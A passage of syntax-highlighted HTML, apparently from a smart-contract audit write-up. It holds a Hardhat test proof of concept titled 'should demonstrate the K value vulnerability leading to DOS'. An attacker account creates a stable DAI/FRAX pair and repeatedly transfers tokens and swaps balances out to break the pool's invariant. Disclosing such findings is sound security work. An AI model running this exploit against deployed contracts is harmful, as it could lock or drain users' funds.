class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT1InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eadd\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e); \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Update local tracking\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker swaps out (current balance of token0 -1) from the pair to leave 1 behind\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// This is to match the PoC\u0026#39;s final state of 1 t0 and 2 t1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT0ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) ? \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentBalanceT0InPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esub\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) : \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eBigNumber\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT0ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairInstance\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountT0ToSwapOut\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecurrentAttacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;0x\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eit\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eonly\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;should demonstrate the K value vulnerability leading to DOS\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003easync\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e () {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Determine token0 and token1 based on addresses for createPair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eif\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoLowerCase\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        } \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eelse\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrax\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token0\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003edai\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// token1\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Create a stable pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// The deployer of PairFactory is the owner and can create pairs\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003edeployer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ecreatePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceipt\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etx\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003ewait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efactory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003egetPair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003etrue\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eexpect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enot\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eequal\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eethers\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econstants\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eAddressZero\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk8\"\u003e\u0026quot;Pair address should not be zero\u0026quot;\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ePair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eattach\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epairAddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Pair Address: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Token0: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e === \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() ? \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() : \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e)`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`Token1: \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e === \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etoken1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() ? \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenB\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e() : \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003esymbol\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e()\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e)`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk4\"\u003econst\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumCycles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e11\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk15\"\u003efor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk4\"\u003elet\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u0026lt; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumCycles\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e; \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e++) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk10\"\u003econsole\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003elog\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk6\"\u003e\\n\u003c/span\u003e\u003cspan class=\"mtk8\"\u003eCycle \u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e + \u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e/\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e${\u003c/span\u003e\u003cspan class=\"mtk12\"\u003enumCycles\u003c/span\u003e\u003cspan class=\"mtk4\"\u003e}\u003c/span\u003e\u003cspan class=\"mtk8\"\u003e`\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk3\"\u003e// Attacker transfers MINT_AMOUNT of each token to the pair\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e            \u003c/span\u003e\u003cspan class=\"mtk15\"\u003eawait\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenA\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk11\"\u003econnect\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eattacker\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003etransfer\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan 